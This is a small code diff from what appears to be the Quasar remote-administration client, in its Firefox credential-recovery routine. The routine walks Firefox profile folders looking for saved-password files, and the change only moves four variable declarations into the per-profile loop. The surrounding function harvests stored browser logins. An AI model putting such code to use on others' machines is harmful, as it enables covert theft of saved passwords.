@@ -15,11 +15,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         /// <inheritdoc />
         public IEnumerable<RecoveredAccount> ReadAccounts()
-        { 
-            string signonsFile = null;
-            string loginsFile = null;
-            bool signonsFound = false;
-            bool loginsFound = false;
+        {
             string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
 
             var logins = new List<RecoveredAccount>();
@@ -28,6 +24,11 @@ namespace Quasar.Client.Recovery.Browsers
 
             foreach (string dir in dirs)
             {
+                string signonsFile = string.Empty;
+                string loginsFile = string.Empty;
+                bool signonsFound = false;
+                bool loginsFound = false;
+
                 string[] files = Directory.GetFiles(dir, "signons.sqlite");
                 if (files.Length > 0)
 				{
